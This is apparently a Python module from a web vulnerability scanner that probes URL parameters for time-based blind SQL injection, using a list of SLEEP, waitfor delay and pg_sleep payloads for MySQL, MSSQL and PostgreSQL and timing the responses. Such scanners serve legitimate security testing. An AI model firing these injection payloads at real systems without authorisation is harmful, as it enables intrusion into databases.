# coding=utf-8
import request
import result
import Levenshtein
import copy
import re
import os
import time 
DelayPayload = (
	#MYSQL 5
	" or SLEEP(%s);-- ", 
	"' or SLEEP(%s);-- " ,
	'" or SLEEP(%s);-- ', 
	'` or SLEEP(%s);-- ', 
	
	#MYSQL 4
	#"+or+BENCHMARK(250000%s,MD5(1))",                     
	#"'+or+BENCHMARK(250000%s,MD5(1))+or+'1'='1",
	#'"+or+BENCHMARK(250000%s,MD5(1))+or+"1"="1',            
														   
	#MSSQL                                                 
	";waitfor delay '0:0:%s';-- ",        
	"';waitfor delay '0:0:%s';-- ",         
	");waitfor delay '0:0:%s';-- " ,        
	"));waitfor delay '0:0:%s';-- ",        
	"');waitfor delay '0:0:%s';-- " ,      
	"'));waitfor delay '0:0:%s';-- ",      
	
	# PostgreSQL		
	" or pg_sleep(%s)",
	"' or pg_sleep(%s) and '1'='1",
	'" or pg_sleep(%s) and "1"="1'
	)

class BSqliTimeDelay():
	def __init__(self, req, repeat=3):
		self._req = copy.deepcopy(req)
		self._repeat = repeat
				
	def get_origin_time(self):
		originTime = 0.0
		allTime = 0.0
		for i in range(self._repeat):
			time1= time.time()
			request.sendRequest(self._req)
			time2= time.time()
			allTime += (time2 - time1)
		originTime = allTime / self._repeat
		return originTime

	def get_payload_time(self,req,payloadQuery):
		time1= time.time()
		rsp = request.sendPayload(req,payloadQuery)
		time2= time.time()
		return time2 - time1, rsp

	def time_delay(self):
		originTime = self.get_origin_time()
		for i in range(len(DelayPayload)):
			req = copy.deepcopy(self._req)
			# use DelayPayload to generate payload req
			delaySeconds = "3"
			maxTimeDiff  = 2 
			payloadQueryList = request.get_payload_query_list(req._query,DelayPayload[i]%(delaySeconds))
			for payload in payloadQueryList:
				payloadTime, rsp = self.get_payload_time(req,payload)
				if (payloadTime - originTime) > maxTimeDiff:
					print "**************************"
					print "* Find time delay sqli vuln!"
					print "* URL:",self._req._url
					print "* Payload:",DelayPayload[i]%(delaySeconds)
					print "**************************"    
					return result.Result([req],[rsp],[DelayPayload[i]%(delaySeconds)],vulnName='time delay sqli vuln',advice='use orm')
		return None

	
def start(req):
    req._timeout = 20
    bsi = BSqliTimeDelay(req)

    return bsi.time_delay()
					